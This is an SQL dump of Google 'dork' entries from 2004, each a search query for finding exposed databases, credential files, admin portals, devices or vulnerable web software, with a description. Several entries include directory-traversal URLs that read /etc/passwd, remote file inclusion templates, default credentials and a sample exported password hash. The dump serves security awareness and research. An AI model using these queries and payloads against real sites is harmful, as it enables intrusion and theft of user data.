(459, 'link:http://www.toastforums.com/', 'http://www.google.com/search?hl=en&ie=UTF-8&q=link%3Ahttp%3A%2F%2Fwww.toastforums.com%2F&btnG=Google+Search', 1531, '2004-09-06', 'Toast Forums is an ASP message board on the Internet. Toast Forums also has all the features of an advanced message board (see hxxp://www.toastforums.com/). The problem is in the install documentation (quoting):-- start quote --2. Rename the data.mdb file to a different name. After renaming the data.mdb file, open constants.asp and change the tstDBConnectString constant to reflect the new name. -- end quote --This search finds sites running Toast Forum by using the LINK: operator. Trial and error is needed to find the database file from the results by changing the URL. Member data can be found in the table "tstdb_Member". It looks like this:"ID" "FName" "LName" "Username" "Password" "Email" "HideEmail" "ICQ" "Homepage" "Signature" "IP" "Skin" "IncludeSignature" "NotifyDefault" "PostCount" "LastLoginDate" "LastPostDate"Passwords are encrypted with the RC4 algoritm, so an attacker would find cracking them is (more) difficult (than usual).', '2004-09-06', NULL, NULL),
(460, 'snitz! forums db path error', 'http://www.google.com/search?q=databasetype.+Code+:+80004005.+Error+Description+:&num=100&hl=en&lr=&ie=UTF-8&safe=off&start=0&sa=N', 1361, '2004-09-07', 'snitz forums uses a microsoft access databases for storage and the default name is "Snitz_forums_2000.mdb". The installation recommends changing both the name and the path. If only one is changed this database error occurs.  An attacker may use this information as a hint to the location and the changed name for the database, thus rendering the forum vulnerable to hostile downloads.', '2004-09-07', NULL, NULL),
(461, '"Powered by Ikonboard 3.1.1"', 'http://www.google.com/search?hl=en&ie=UTF-8&q=%22Powered+by+Ikonboard+3.1.1%22', 943, '2004-09-07', 'IkonBoard (http://www.ikonboard.com/) is a comprehensive web bulletin board system, implemented as a Perl/CGI script.There is a flaw in the Perl code that cleans up user input before interpolating it into a string which gets passed to Perl''s eval() function, allowing an attacker to evaluate arbitrary Perl and hence run arbitrary commands.More info at: http://www.securitytracker.com/alerts/2003/Apr/1006446.htmlThe bug was fixed in 3.1.2.', '2004-09-07', NULL, NULL),
(462, 'inurl:snitz_forums_2000.mdb', 'http://www.google.com/search?q=inurl%3Asnitz_forums_2000.mdb', 1920, '2004-09-07', 'The SnitzTM Forums 2000 Version 3.4.04 Installation Guide and Readme says:  "it is strongly recommended that you change the default database name from snitz_forums_2000.mdb to a cryptic or not easy to guess name."Of course, we know readme''s are for lamers.. right admins ?[murfie@forofo googledorks]$ mdb-export snitz_forums_2000.mdb FORUM_MEMBERSMEMBER_ID,M_STATUS,M_NAME,M_USERNAME,M_PASSWORD,M_EMAIL, [etc]1,1,"adminadmin","58180bb12beb55a4bffbxxde75cxxc53dcc8061c3cdee52e0ebdcd74049d374e","yourmail@server.com"," "," ","","",1,1,1,3," "," "," ","20030918120147",2,"20030918120207","20030918120224","Forum Admin","10.xx.xx.72",0,0,1,"000.000.000.000","","","","","","","","","","",""," "," ","",""," ","","","","",1(data xx''d at some points) The password hash value is a SHA256 encoded string (with no salting). Every attacker knows they can be broken with a dictionary attack using a very simpel perl or C program.http://murfnet.xs4all.nl/public/scripts/perl/desnitz.txt', '2004-09-07', NULL, NULL),
(463, 'WebAPP directory traversal', 'http://www.google.com/search?num=100&q=inurl%3A%2Fcgi-bin%2Findex.cgi+inurl%3Atopics+inurl%3Aviewcat%3D+%2Bintext%3A%22WebAPP%22+-site%3Aweb-app.org', 828, '2004-09-07', 'WebAPP is advertised as the internet''s most feature rich, easy to run PERL based portal system. The WebAPP system has a serious reverse directory traversal vulnerabilityhttp:///cgi-bin/index.cgi?action=topics&amp;viewcat=../../../../../../../etc/passwd%00http:///cgi-bin/index.cgi?action=topics&amp;viewcat=../../db/members/admin.dat%00Detailed info : http://www.packetstormsecurity.com/0408-exploits/webapp.traversal.txtCredits goes to PhTeam for discovering this vulnerability.', '2004-09-07', NULL, NULL),
(464, 'filetype:rdp rdp', 'http://www.google.com/search?q=filetype%3Ardp+rdp', 2095, '2004-09-07', 'These are Remote Desktop Connection (rdp) files. They contain the settings and sometimes the credentials to connect to another windows computer using the RDP protocols.', '2004-09-07', NULL, NULL),
(465, 'filetype:reg "Terminal Server Client"', 'http://www.google.com/search?q=filetype%3Areg+%22Terminal+Server+Client%22', 1428, '2004-09-07', 'These are Microsoft Terminal Services connection settings registry files. They may sometimes contain encrypted passwords and IP addresses.', '2004-09-07', NULL, NULL),
(467, 'intitle:"Index of *" inurl:"my shared folder" size modified', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22Index+of+*%22+inurl%3A%22my+shared+folder%22+size+modified&btnG=Search', 4396, '2004-09-10', 'These are index pages of "My Shared Folder". Sometimes they contain juicy stuff like mp3''s or avi files. Who needs pay sites for music when you got Google ? :) Uhm, well except for the copyright issue.', '2004-09-10', NULL, NULL),
(468, 'E-market remote code execution', 'http://www.google.com/search?q=inurl%3A%22%2Fbecommunity%2Fcommunity%2Findex.php%3Fpageurl%3D%22&sourceid=mozilla-search&start=0&start=0&ie=utf-8&oe=utf-8', 843, '2004-09-10', 'E-market is commercial software made by a korean company(http://www.bbs2000.co.kr). A vulnerability in this software was reported to Bugtraq. The exploit is possible with the index.php script:http://[TARGET]/becommunity/community/index.php?pageurl=[injection URL]http://[TARGET]/becommunity/community/index.php?from_market=Y&amp;pageurl=[injection URL] For more information read this:http://echo.or.id/adv/adv06-y3dips-2004.txt Author: y3dipsDate: Sept, 7th 2004Location: Indonesian, Jakarta', '2004-09-10', NULL, NULL),
(469, 'filetype:pot inurl:john.pot', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Apot+inurl%3Ajohn.pot+&btnG=Google+Search', 1813, '2004-09-10', 'John the Ripper is a popular cracking program every hacker knows. It''s results are stored in a file called john.pot.This search finds such results files, currently only one. Also No results for the distributed john version (djohn.pot) today :)PS: This was posted to the "fun" forum, so don''t take this too seriously !', '2004-09-10', NULL, NULL),
(471, 'filetype:xls inurl:"email.xls"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Axls+inurl%3A%22email.xls%22+&btnG=Search', 5138, '2004-09-10', 'Our forum members never get tired of finding juicy MS office files. Here''s one by urban that finds email addresses.', '2004-09-10', NULL, NULL),
(472, 'filetype:pdb pdb backup (Pilot | Pluckerdb)', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Apdb+pdb+backup+%28Pilot+%7C+Pluckerdb%29+&btnG=Google+Search', 1619, '2004-09-10', 'Hotsync database files can be found using "All databases on a Palm device, including the ones you create using NS Basic/Palm, have the same format. Databases you create using NS Basic/Palm have the backup bit set by default, so they are copied to your "x:\\palm\\{username}\\backup"The forum members suggested adding Pilot and Pluckerdb (linux software for pda), so the results are more clean. (pdb files can be used for protein databases, which we don''t want to see).Currently we don''t know of a program to "read" these binary files.', '2004-09-10', NULL, NULL),
(473, 'filetype:pl "Download: SuSE Linux Openexchange Server CA"', 'http://www.google.com/search?hl=de&ie=ISO-8859-1&q=filetype%3Apl+%22Download%3A+SuSE+Linux+Openexchange+Server+CA%22+%0D%0A+%0D%0A&btnG=Google-Suche&meta=', 1156, '2004-09-10', 'this search will get you on the web administration portal of linux open exchange servers.', '2004-09-10', NULL, NULL),
(474, 'intitle:"dreambox web"', 'http://www.google.com/search?hl=de&ie=ISO-8859-1&q=intitle%3A%22dreambox+web%22+&btnG=Google-Suche&meta=', 2031, '2004-09-10', 'this search will show web administration interfaces of linux dream boxes.The Dreambox is one of the popular 3rd generation boxes. Based on a powerful IBM PowerPC (not PC !) with an MPEG1/2 hardware decoder, this box is FULLY open, with an open source Linux operating system. The Dreambox not only offers high quality video and audio, but also has a variety of connections to the outside world: Ethernet, USB, PS2, Compact Flash and two Smartcard readers. The box can handle any dish configuration, an unlimited number of channels or satellites, has a very fast channel scan, allows for direct digital recording, etc.', '2004-09-10', NULL, NULL),
(475, 'PHP-Nuke - create super user right now !', 'http://www.google.com/search?q=%22create+the+Super+User%22+%22now+by+clicking+here%22', 2000, '2004-09-13', 'PHP-Nuke is a popular web portal thingie. It has popped up in the Google dorks before. I think we let this one describe itself, quoting from a vulnerable page:"Welcome to PHP-Nuke!Congratulations! You have now a web portal installed!. You can edit or change this message from the Administration page. For security reasons the best idea is to create the Super User right NOW by clicking HERE."', '2004-09-13', NULL, NULL),
(476, 'filetype:asp DBQ=" * Server.MapPath("*.mdb")', 'http://www.google.com/search?num=100&q=filetype%3Aasp+DBQ%3D%22+%26+Server.MapPath%28%22*.mdb%22%29', 1561, '2004-09-18', 'This search finds sites using Microsoft Access databases, by looking for the the database connection string. There are forums and tutorials in the results, but also the real databases. An attacker can use this to find the name and location of the database and download it for his viewing pleasure, which may lead to information leakage or worse.', '2004-09-18', NULL, NULL),
(477, 'intitle:"TUTOS Login"', 'http://www.google.com/search?q=intitle%3A%22TUTOS+Login%22', 1159, '2004-09-18', 'TUTOS stands for "The Ultimate Team Organization Software." This search finds the login portals to TUTOS.Adding scheme.php in the /php/ directory seems to allow cool things. There seems to be a foothold for SQL table structures and, upon errors, directory structure of the server. It is said that with the username linus and the password guest you can see what it looks like when your logged in. This is unconfirmed as of now.', '2004-09-18', NULL, NULL),
(478, '"Login to Usermin" inurl:20000', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=%22Login+to+Usermin%22+inurl%3A20000', 1189, '2004-09-18', 'Usermin is a web interface that can be used by any user on a Unix system to easily perform tasks like reading mail, setting up SSH or configuring mail forwarding. It can be thought of as a simplified version of Webmin designed for use by normal users rather than system administrators.', '2004-09-18', NULL, NULL),
(479, 'filetype:lit lit (books|ebooks)', 'http://www.google.com/search?num=100&q=filetype%3Alit+lit+%28books%7Cebooks%29', 1777, '2004-09-18', 'Tired of websearching ? Want something to read ? You can find Ebooks (thousands of them) with this search..LIT files can be opened with Microsoft Reader (http://www.microsoft.com/reader/)', '2004-09-18', NULL, NULL),
(480, '"Powered *: newtelligence" ("dasBlog 1.6"| "dasBlog 1.5"| "dasBlog 1.4"|"dasBlog 1.3")', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22Powered+*%3A+newtelligence%22+%28%22dasBlog+1.6%22%7C+%22dasBlog+1.5%22%7C+%22dasBlog+1.4%22%7C%22dasBlog+1.3%22%29&btnG=Search', 862, '2004-09-18', 'DasBlog is reportedly susceptible to an HTML injection vulnerability in its request log. This vulnerability is due to a failure of the application to properly sanitize user-supplied input data before using it in the generation of dynamic web pages. Versions 1.3 - 1.6 are reported to be vulnerable.More:http://www.securityfocus.com/bid/11086/discussion/', '2004-09-18', NULL, NULL),
(481, 'Lotus Domino address books', 'http://www.google.com/search?num=100&q=inurl%3A%22%2Fnames.nsf%3FOpenDatabase%22+-inurl%3Agov', 1368, '2004-09-18', 'This search will return any Lotus Domino address books which may be open to the public. This can contain a lot of detailed personal info you don''t want to fall in the hands of your competitors or hackers. Most of them are password protected.', '2004-09-18', NULL, NULL),
(482, 'intitle:"Login - powered by Easy File Sharing Web Server"', 'http://www.google.com/search?hl=en&ie=UTF-8&q=intitle%3A%22Login+-+powered+by+Easy+File+Sharing+Web+Server%22+&btnG=Google+Search', 1310, '2004-09-18', 'Easy File Sharing Web Server is a file sharing software that allows visitors to upload/download files easily through a Web Browser (IE,Netscape,Opera etc.)". More information at: http://www.securityfocus.com/bid/11034/discussion/An attacker can reportedly bypass the authentication by entering the the name of the virtual folder directly.', '2004-09-18', NULL, NULL),
(483, 'intitle:"Tomcat Server Administration"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22Tomcat+Server+Administration%22', 1426, '2004-09-18', 'This finds login portals for Apache Tomcat, an open source Java servlet container which can run as a standalone server or with an Apache web server.', '2004-09-18', NULL, NULL),
(484, 'ez Publish administration', 'http://www.google.com/search?q=Admin+intitle%3A%22eZ+publish+administration%22', 1489, '2004-09-21', 'Thousands of enterprises, governmental offices, non-profit organizations, small and middle sized companies and educational institutions around the world trust eZ publish for running their web solutions.Vendor site: http://www.ez.no/Vulnerabilities: http://search.securityfocus.com/swsearch?query=ez+publish&amp;sbm=bid&amp;submit=Search%21&amp;metaname=alldoc&amp;sort=swishlastmodifiedDepending on the version two queries can usedAdmin intitle:"eZ publish administration"intitle:"Login" "Welcome to eZ publish administration"Crosssite Scriting, Information Disclosure, Pathdisclosure available on older versions', '2004-09-21', NULL, NULL),
(485, 'inurl:administrator "welcome to mambo"', 'http://www.google.com/search?q=inurl%3Aadministrator+%22welcome+to+mambo%22', 1111, '2004-09-21', 'Mambo is a full-featured content management system that can be used for everything from simple websites to complex corporate applications. Continue reading for a detailed feature list.Vendor: http://www.mamboserver.com/Cross Site Scripting and SQL injection exist in some versions 4.5 current version is 4.5.1RC3 Vulnerabilities: http://search.securityfocus.com/swsearch?query=mambo+open+source&amp;sbm=bid&amp;submit=Search%21&amp;metaname=alldoc', '2004-09-21', NULL, NULL),
(486, '"Powered by DCP-Portal v5.5"', 'http://www.google.com/search?q=%22Powered+by+DCP-Portal+v5.5%22', 1082, '2004-09-21', 'DCP-Portal is more a community system than a CMS - it nevertheless calls itsself CMS. They have never seen a real CMS. Version 5.5 is vulnerable sql injection.Vulnerabilities: http://search.securityfocus.com/swsearch?query=dcp-portal&amp;sbm=bid&amp;submit=Search%21&amp;metaname=alldoc', '2004-09-21', NULL, NULL),
(487, 'inurl:"typo3/index.php?u=" -demo', 'http://www.google.com/search?q=inurl%3A%22typo3%2Findex.php%3Fu%3D%22+-demo', 1890, '2004-09-21', 'TYPO3 is a free Open Source content management system for enterprise purposes on the web and in intranets, featuring a set of ready-made interfaces, functions and modules.Vendor: http://www.typo3.com/Vulns: http://search.securityfocus.com/swsearch?query=Typo3&amp;sbm=bid&amp;submit=Search%21&amp;metaname=alldoc', '2004-09-21', NULL, NULL),
(489, 'Quicksite demopages for Typo3', 'http://www.google.com/search?q=%22FC+Bigfeet%22+-inurl%3Amail', 857, '2004-09-21', 'TYPO3 is a free Open Source content management system for enterprise purposes on the web and in intranets, featuring a set of ready-made interfaces, functions and modules.The quicksite package is a demosite for typo3. Quicksite or Testsite will install a complete website of a soccerclub using the following credentials:user:adminpassword:passwordIf you want to login, again append "typo3" to the website dir.Vendor: http://www.typo3.com/An attacker will consider this as yet another way to find Typo3 hosts for which security focus lists vulnerabilities.', '2004-09-21', NULL, NULL),
(490, 'site:netcraft.com intitle:That.Site.Running Apache', 'http://www.google.com/search?q=site%3Anetcraft.com+intitle%3AThat.Site.Running+Apache', 1281, '2004-09-21', 'Netcraft reports a site''s operating system, web server, and netblock owner together with, if available, a graphical view of the time since last reboot for each of the computers serving the site. So, Netcraft scans Web servers, Google scans Netcraft, and the hacker scans Google.This search is easily modified (replace "apache" for the other server software), thus adding yet another way to find the webserver software version info.', '2004-09-21', NULL, NULL),
(491, 'ext:log "Software: Microsoft Internet Information Services *.*"', 'http://www.google.com/search?q=ext:log+%22Software:+Microsoft+Internet+Information+Services+*.*%22', 1344, '2004-09-21', 'Microsoft Internet Information Services (IIS) has log files that are normally not in the docroot, but then again, some people manage to share them. An attacker may use these to gather: loginnames (FTP service), pathinformation, databasenames, and stuff..Examples:12:09:37 194.236.57.10 [2501]USER micze 33112:09:38 194.236.57.10 [2501]PASS - 23008:30:38 194.236.57.10 [2416]DELE com-gb97.mdb2000-06-18 15:08:30 200.16.212.225 activeip\\carpinchos 4.22.121.13 80 POST /_vti_bin/_vti_aut/author.dll - 200 2958 551 120 MSFrontPage/4.0 -', '2004-09-21', NULL, NULL),
(492, 'filetype:cgi inurl:tseekdir.cgi', 'http://www.google.com/search?q=filetype%3Acgi+inurl%3Atseekdir.cgi', 817, '2004-09-21', 'The Turbo Seek search engine has a vulnerability. The removed user can look at the contents of files on target. A removed user can request an URL with name of a file, which follows NULL byte (%00) to force system to display the contents of a required file, for example:/cgi-bin/cgi/tseekdir.cgi?location=/etc/passwd%00/cgi-bin/tseekdir.cgi?id=799*location=/etc/passwd%00 More: http://www.securitytracker.com/alerts/2004/Sep/1011221.html', '2004-09-21', NULL, NULL),
(493, '"Powered by phpOpenTracker" Statistics', 'http://www.google.com/search?hl=en&ie=UTF-8&q=%22Powered+by+phpOpenTracker%22+Statistics+&btnG=Google+Search', 1309, '2004-09-21', 'phpOpenTracker is a framework solution for the analysis of website traffic and visitor analysis. More info at the vendor site: http://www.phpopentracker.de/en/index.phpA prebuild sample report is shipped with PhpOpenTracker which is used by most sites. This report does not use all possibilities of the framework like user tracking.', '2004-09-21', NULL, NULL),
(494, 'filetype:vcs vcs', 'http://www.google.com/search?num=100&q=filetype%3Avcs+vcs', 1354, '2004-09-22', 'Filext.com says: "Various programs use the *.VCS extension; too many to list individually. Take clues from the location of the file as a possible pointer to exactly which program is producing the file. The file''s date and time can also help if you know which programs you were running when the file was written."The most common use is the "vCalendar File", used by Outlook for example. It can also belong to a "Palm vCal Desktop Application". For those who prefer clean searches, try these variations (with less results):"PRODID: PalmDesktop Generated"filetype:vcs VCALENDAR filetype:vcs BEGIN:VCALENDAR', '2004-09-22', NULL, NULL),
(495, 'filetype:config config intext:appSettings "User ID"', 'http://www.google.com/search?q=filetype%3Aconfig+config+intext%3AappSettings+%22User+ID%22', 1711, '2004-09-16', 'These files generally contain configuration information for a .Net Web Application. Things like connection strings to databases file directories and more. On a properly setup IIS these files are normally not served to the public.', '2004-09-16', NULL, NULL),
(496, 'inurl:"/catalog.nsf" intitle:catalog', 'http://www.google.com/search?q=inurl%3A%22%2Fcatalog%2Ensf%22+intitle%3Acatalog', 1274, '2004-09-10', 'This will return servers which are running versions of Lotus Domino. The catalog.nsf is the servers DB catalog. It will list all the DB''s on the server and sometimes some juicy info too.  An attacker can back the url down to the "/catalog.nsf" part if needed.', '2004-09-10', NULL, NULL),
(497, 'filetype:pst inurl:"outlook.pst"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Apst+inurl%3A%22outlook.pst%22', 1490, '2004-09-11', 'All versions of the popular business groupware client called Outlook have the possibility to store email, calenders and more in a file for backup or migration purposes.An attacker may learn a great deal about the owner or the company by downloading these files and importing them in his own client for his viewing pleasure.', '2004-09-11', NULL, NULL);
INSERT INTO `dorks` (`dork_id`, `title`, `link`, `hits`, `date`, `description`, `dateSubmission`, `vulnSoftVersion`, `exploitID`) VALUES
(498, '"index of/" "ws_ftp.ini" "parent directory"', 'http://www.google.com/search?num=100&hl=en&q=%22index+of%2F%22+%22ws_ftp.ini%22+%22parent+directory%22', 8295, '2004-09-17', 'This search is a cleanup of a previous entry by J0hnny. It uses "parent directory" to avoid results other than directory listings.WS_FTP.ini is a configuration file for a popular win32 FTP client that stores usernames and weakly encoded passwords. There is another way to find this file, that was added by Xewan:filetype:ini ws_ftp pwdIn our experience it''s good to try both methods, as the results will differ quite a bit.', '2004-09-17', NULL, NULL),
(499, 'filetype:php inurl:index.php inurl:"module=subjects" inurl:"func=*" (listpages| viewpage | listcat)', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Aphp+inurl%3Aindex.php+inurl%3A%22module%3Dsubjects%22+inurl%3A%22func%3D*%22+%28listpages%7C+viewpage+%7C+listcat%29&btnG=Google+Search', 854, '2004-09-23', 'Reportedly the PostNuke Modules Factory Subjects module is affected by a remote SQL injection vulnerability. http://securityfocus.com/bid/11148/discussion/', '2004-09-23', NULL, NULL),
(500, 'W-Nailer Upload Area', 'http://www.google.com/search?q=uploadpics.php%3Fdid%3D+-forum', 1532, '2005-01-13', 'What is W-Nailer?W-Nailer is a PHP script which can create galleries for you.It uses a graphical library (GD) which enables PHP to manipulate images, for instance resizing to create thumbnails.W-Nailer is highly configurable to meet your needs. Even better, the configuration is nearly completely webbased.So after you have uploaded your files, you will just need your browser!', '2005-01-13', NULL, NULL),
(501, 'filetype:cgi inurl:pdesk.cgi', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3Acgi+inurl%3Apdesk.cgi&btnG=Search', 842, '2004-09-23', 'PerlDesk is a web based help desk and email management application designed to streamline support requests, with built in tracking and response logging.http://www.securitytracker.com/alerts/2004/Sep/1011276.html', '2004-09-23', NULL, NULL),
(503, 'inurl:mewebmail', 'http://www.google.com/search?q=inurl:mewebmail&hl=en&lr=&ie=UTF-8&filter=0', 1439, '2004-09-23', 'MailEnable Standard Edition provides robust SMTP and POP3 services for Windows NT/2000/XP/2003 systems. This version is free for both personal and commercial usage and does not have any time, user or mailbox restrictions.This search is a portal search. If finds the logins screens. If a vulnerability is found, this search becomes the target base for an attacker.', '2004-09-23', NULL, NULL),
(504, '"Powered by IceWarp Software" inurl:mail', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=%22Powered+by+IceWarp+Software%22+inurl%3Amail', 938, '2004-09-23', 'IceWarp Web Mail is reported prone to multiple input validation vulnerabilities. Few details regarding the specific vulnerabilities are known. These vulnerabilities are reported to affect all versions of IceWarp Web Mail prior to version 5.2.8.There are two ways to find installations of IceWarp:"Powered by IceWarp Software" inurl:mailintitle:"IceWarp Web Mail" inurl:":32000/mail/"http://www.securityfocus.com/bid/10920', '2004-09-23', NULL, NULL),
(506, 'intitle:"MRTG/RRD" 1.1* (inurl:mrtg.cgi | inurl:14all.cgi |traffic.cgi)', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22MRTG%2FRRD%22+1.1*+%28inurl%3Amrtg.cgi+%7C+inurl%3A14all.cgi+%7Ctraffic.cgi%29+&btnG=Search', 926, '2004-09-24', 'The remote user can reportedly view the first string of any file on the system where script installed. This is a very old bug, but some sites never upgraded their MRTG installations.http://www.securitytracker.com/alerts/2002/Feb/1003426.htmlAn attacker will find it difficult to exploit this in any usefull way, but it does expose one line of text from a file, for example (using the file /etc/passwd) shows this:ERROR: CFG Error Unknown Option "root:x:0:1:super-user:/" on line 2 or above.', '2004-09-24', NULL, NULL),
(507, 'filetype:mdb wwforum', 'http://www.google.com/search?q=filetype%3Amdb+wwforum', 2300, '2004-09-24', 'Web Wiz Forums is a free ASP Bulletin Board software package. It uses a Microsoft Access database for storage. The installation instructions clearly indicate to change the default path and filename (admin/database/wwForum.mdb).vendor: http://www.webwizguide.info/web_wiz_forums/The forum database contains the members passwords, either encrypted or in plain text, depending on the version.Please note: this search is proof that results can stay in Google''s index for a long time, even when they are not on the site any longer. Currently only 2 out of 9 are actually still downloadable by an attacker.', '2004-09-24', NULL, NULL),
(509, 'intitle:"microsoft certificate services" inurl:certsrv', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&newwindow=1&q=intitle%3A%22microsoft+certificate+services%22+inurl%3Acertsrv&btnG=Search', 1143, '2004-09-24', 'Microsoft Certificate Services Authority (CA) software can be used to issue digital certificates. These are often used as "proof" that someone or something is what they claim they are. The Microsoft certificates are meant to be used with IIS for example with Outlook Web Access. The users of these certificates have to decide if they trust it or not. If they do, they can import a root certificate into their browsers (IE).Anyways, this search by JimmyNeutron uncovers a few of these certificate servers directly connected to the Internet. Which (in theory) means anyone could issue a certificate from these sites and abuse it to mislead websurfers in phishing scams and such.', '2004-09-24', NULL, NULL),
(511, 'intitle:AnswerBook2 inurl:ab2/ (inurl:8888 | inurl:8889)', 'http://www.google.com/search?num=100&&q=intitle%3AAnswerBook2+inurl%3Aab2%2F+%28inurl%3A8888+%7C+inurl%3A8889%29', 2483, '2004-09-26', 'First of all this search indicates solaris machines and second the webservice is vulnerable to a format string attack.Sun''s AnswerBook 2 utilizes a third-party web server daemon (dwhttpd) that suffers from a format string vulnerability. The vulnerability can be exploited to cause the web server process to execute arbitrary code. The web server runs as user and group ''daemon'' who, under recent installations of Solaris, owns no critical fileshttp://www.securiteam.com/unixfocus/5SP081F80K.htm', '2004-09-26', NULL, NULL),
(512, 'More Axis netcams !', 'http://www.google.com/search?q=intitle%3A%22Live+View+%2F+-+AXIS%22+%7C+inurl%3Aview%2Fview.shtml%5E', 2321, '2004-09-29', 'More Axis Netcams, this search combines the cams with the default title (Live View) and extends it by searching for the "view/view.shtml" URL identifier. Models found with this search are:AXIS 205 version 4.02AXIS 206M Network Camera version 4.10AXIS 206W Network Camera version 4.10AXIS 211 Network Camera version 4.02AXIS 241S Video Server version 4.02AXIS 241Q Video Server version 4.01Axis 2100 Network CameraAxis 2110 Network Camera 2.34Axis 2120 Network Camera 2.40AXIS 2130R PTZ Network Camera', '2004-09-29', NULL, NULL),
(513, 'intitle:"The AXIS 200 Home Page"', 'http://www.google.com/search?q=intitle:%22The+AXIS+200+Home+Page%22', 4438, '2004-09-29', 'The Axis 200 HOME pages reside within the AXIS 200 device and  hold information about the current software version, technical documentation, some howto''s and the device settings.', '2004-09-29', NULL, NULL),
(514, '("Fiery WebTools" inurl:index2.html) | "WebTools enable * * observe, *, * * * flow * print jobs"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%28%22Fiery+WebTools%22+inurl%3Aindex2.html%29+%7C+%22WebTools+enable+*+*+observe%2C+*%2C+*+*+*+flow+*+print+jobs%22&btnG=Search', 1486, '2004-09-29', 'Fiery WebTools offers many of the same capabilities of the Command WorkStationÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢, via a Java-enabled Web browser. All job control options such as job merging, edition and previews, as well as information on the status of the jobs are accessible through Fiery WebTools.', '2004-09-29', NULL, NULL),
(515, 'Konica Network Printer Administration', 'http://www.google.com/search?q=intitle%3A%22network+administration%22+inurl%3A%22nic%22', 1362, '2004-09-29', 'This finds Konica Network Printer Administration pages. There is one result at the time of writing.', '2004-09-29', NULL, NULL),
(516, 'Aficio 1022', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=inurl%3Asts_index.cgi', 1291, '2004-09-29', 'The Ricoh Aficio 1022 is a digital multifunctional B&amp;W copier, easily upgraded to include network printing, network scanning, standard/LAN faxing and storage capabilities.', '2004-09-29', NULL, NULL),
(517, 'intitle:RICOH intitle:"Network Administration"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3ARICOH+intitle%3A%22Network+Administration%22', 1723, '2004-09-29', 'Network Administration pages for several Ricoh Afficio printer models, for example the Aficio 1018D and RICOH LASER AP1600.', '2004-09-29', NULL, NULL),
(518, 'intitle:"lantronix web-manager"', 'http://www.google.com/search?q=intitle:%22lantronix+web-manager%22&hl=en&lr=&ie=UTF-8&filter=0', 1663, '2004-09-29', 'The Lantronix web manager home pages show the print server configuration (Server Name, Boot Code Version, Firmware, Uptime, Hardware Address, IP Address and Subnet Mask). The other setting pages are password protected.', '2004-09-29', NULL, NULL),
(519, 'Canon ImageReady machines', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22remote+ui%3Atop+page%22', 1510, '2004-09-29', 'The "large" Canon ImageReady machines with model versions 3300, 5000 &amp; 60000.', '2004-09-29', NULL, NULL),
(520, '((inurl:ifgraph "Page generated at") OR ("This page was built using ifgraph"))', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=%28%28inurl%3Aifgraph+%22Page+generated+at%22%29+OR+%28%22This+page+was+built+using+ifgraph%22%29%29+&btnG=Search', 1211, '2004-09-29', 'ifGraph is a set of perl scripts that were created to fetch data from SNMP agents and feed a RRD file (Round Robin Database) so that graphics can be created later. The graphics and the databases are created using a tool called RRDTool.', '2004-09-29', NULL, NULL),
(521, 'ext:cgi intext:"nrg-" " This web page was created on "', 'http://www.google.com/search?q=ext:cgi+intext:%22nrg-%22+%22+This+web+page+was+created+on+%22&hl=en&lr=&ie=UTF-8&filter=1', 1211, '2004-09-29', 'NRG is a system for maintaining and visualizing network data and other resource utilization data. It automates the maintenance of RRDtool databases and graph web pages (that look like MRTG web pages.)', '2004-09-29', NULL, NULL),
(522, '+":8080" +":3128" +":80" filetype:txt', 'http://www.google.com/search?hl=en&ie=UTF-8&q=%2B%22%3A8080%22+%2B%22%3A3128%22+%2B%22%3A80%22+filetype%3Atxt', 4306, '2004-09-29', 'With the string [+":8080" +":3128" +":80" filetype:txt] it is possible to find huge lists of proxies... So, I''ve written a simple shell script that checks these lists and filters out the not responding proxies. It also stores time response in another file, so you can choose only fast proxies. Furthermore it can control the zone of the proxy with a simple whois grep... The script proxytest.sh is on my website:http://rawlab.relay.homelinux.net/programmi/proxytest.sh', '2004-09-29', NULL, NULL),
(523, 'ReMOSitory module for Mambo', 'http://www.google.com/search?q=inurl%3Acom_remository', 822, '2004-09-29', 'It is reported that the ReMOSitory module for Mambo is prone to an SQL injection vulnerability. This issue is due to a failure of the module to properly validate user supplied URI input. Because of this, a malicious user may influence database queries in order to view or modify sensitive information, potentially compromising the software or the database. It may be possible for an attacker to disclose the administrator password hash by exploiting this issue.Full report: http://www.securityfocus.com/bid/11219Klouw suggests: inurl:index.php?option=com_remository&amp;Itemid= Renegade added : ".. to get an administrator login, change the url to http://www.example.com/administrator .. it will pop up an login box...', '2004-09-29', NULL, NULL),
(525, 'inurl:hp/device/this.LCDispatcher', 'http://www.google.com/search?hl=de&ie=ISO-8859-1&q=inurl%3Ahp%2Fdevice%2Fthis.LCDispatcher+&btnG=Suche&lr=&btnG=Google-Suche&meta=', 3220, '2004-10-05', 'This one gets you on the web interface of some more HP Printers.', '2004-10-05', NULL, NULL),
(526, 'intitle:"WordPress > * > Login form" inurl:"wp-login.php"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22WordPress+%3E+*+%3E+Login+form%22+inurl%3A%22wp-login.php%22+&btnG=Search', 1273, '2004-10-05', 'WordPress is a semantic personal publishing platform.. it suffers from a possible XSS attacks.http://www.securityfocus.com/bid/11268/info/', '2004-10-05', NULL, NULL),
